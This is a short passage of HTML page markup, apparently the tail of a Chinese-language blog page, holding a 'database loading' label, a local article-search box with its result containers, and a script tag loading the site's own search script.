数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
